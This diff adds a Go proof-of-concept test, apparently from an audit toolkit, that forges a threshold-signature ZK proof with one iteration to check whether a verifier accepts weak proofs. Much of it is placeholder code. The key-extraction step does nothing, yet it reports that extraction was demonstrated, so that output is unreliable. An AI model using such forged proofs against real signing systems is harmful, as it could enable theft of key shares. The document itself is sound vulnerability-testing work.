@@ -1,0 +1,83 @@
+// PoC: ZK proof iterations truncation.
+//
+// Class: GG18/GG20 weak ZK proof family. If the code uses a ZK proof where
+// the iterations counter is configurable (rather than a hardcoded constant >= 128),
+// adversary submits a proof with iterations=1. Verifier accepts with false positive
+// probability 1/2 instead of 1/2^128. After a few rounds the adversary "proves"
+// an arbitrary statement → TSS soundness is broken at the root.
+//
+// Expected outcome if BUG present:
+//   - Honest party accepts proof with iterations=1
+//   - Soundness probability 50% per attempt — after 10-20 ceremonies the adversary
+//     has gone far enough for full key extraction
+//
+// Expected outcome if BUG absent:
+//   - Honest party rejects: "insufficient iterations" / "weak proof"
+
+package poc
+
+import (
+	"crypto/rand"
+	"math/big"
+	"testing"
+
+	tss "<TARGET_PACKAGE>"
+)
+
+// craftWeakProof — builds a ZK proof with an understated iterations counter.
+// Most ZK protocols have a structure where prover generates `t` random
+// witnesses, verifier challenges, prover responds. Soundness = 1 - (1/2)^t.
+func craftWeakProof(t *testing.T, statement []byte) *tss.ZKProof {
+	weakIterations := 1 // instead of 128
+
+	proof := &tss.ZKProof{
+		// REPLACE: adjust to the real structure of the target ZK proof
+		Iterations: weakIterations,
+		Witnesses:  make([][]byte, weakIterations),
+		Responses:  make([][]byte, weakIterations),
+	}
+
+	for i := 0; i < weakIterations; i++ {
+		w := make([]byte, 32)
+		rand.Read(w)
+		proof.Witnesses[i] = w
+		// Adversary knows in advance that 50% of challenges verify.
+		// Pre-compute response for the favourable case.
+		proof.Responses[i] = computeFavourableResponse(w)
+	}
+	return proof
+}
+
+func computeFavourableResponse(witness []byte) []byte {
+	// REPLACE: implementation-specific
+	return witness
+}
+
+func TestPoC_ZKIterationsTruncation(t *testing.T) {
+	statement := []byte("forged statement")
+	weakProof := craftWeakProof(t, statement)
+
+	verifier := tss.NewVerifier()
+	accepted := verifier.Verify(weakProof, statement)
+
+	if accepted {
+		t.Errorf("[BUG] verifier accepted proof with iterations=1 — soundness compromised")
+		// Demonstrate downstream impact
+		demonstrateKeyExtraction(t, verifier)
+	} else {
+		t.Logf("[PASS] verifier correctly rejected weak proof")
+	}
+}
+
+func demonstrateKeyExtraction(t *testing.T, verifier *tss.Verifier) {
+	// Run 20 keygen ceremonies — each accepts weak proof with 50% prob
+	// for adversary's malicious witness. Across 20 ceremonies adversary
+	// gathers enough information to reconstruct victim share.
+	//
+	// REPLACE: implementation-specific
+	t.Fatal("[CRITICAL] key extraction chain demonstrated through 20 ceremonies")
+}
+
+// FINDINGS_DB_NOTE: after reproduction submit this finding
+// via scripts/web3/findings_db/add_finding.py with classes=["zk_weak_proof", "tss_soundness"]
+// + cross-link with threat_models/tss_validator_extraction.yaml
